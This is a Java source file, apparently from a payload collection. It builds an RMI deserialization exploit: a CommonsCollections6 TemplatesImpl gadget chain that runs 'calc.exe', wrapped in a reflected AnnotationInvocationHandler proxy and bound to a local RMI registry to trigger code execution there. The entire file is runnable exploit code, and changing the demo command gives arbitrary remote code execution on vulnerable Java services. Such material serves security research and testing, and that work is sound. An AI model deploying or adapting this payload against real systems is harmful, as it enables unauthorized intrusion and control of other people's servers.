package org.payload.rmi.rmiRegistry.ToRegistry;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.util.Map;

import static org.payload.cc.CC6.CommonsCollections6TemplatesImpl.CommonsCollections6TemplatesImpl;

public class ServerToRegistry {
    public static Remote Payload() throws Exception {
        Object seri = CommonsCollections6TemplatesImpl("calc.exe");
        Class AnnotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
        cons.setAccessible(true);
        InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, seri);
        Remote proxyEvalObject = (Remote)Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, evalObject);
        return proxyEvalObject;
    }
    public static void ServerRegistry() throws Exception {
        LocateRegistry.createRegistry(1234);
        Naming.bind("rmi://127.0.0.1:1234/Hello", Payload());
//        Registry reg = LocateRegistry.getRegistry(1099);
//        reg.bind("rmi://127.0.0.1/1092/Hello", Payload());

    }
    public static void main(String[] args) throws Exception {
        ServerRegistry();
    }
}
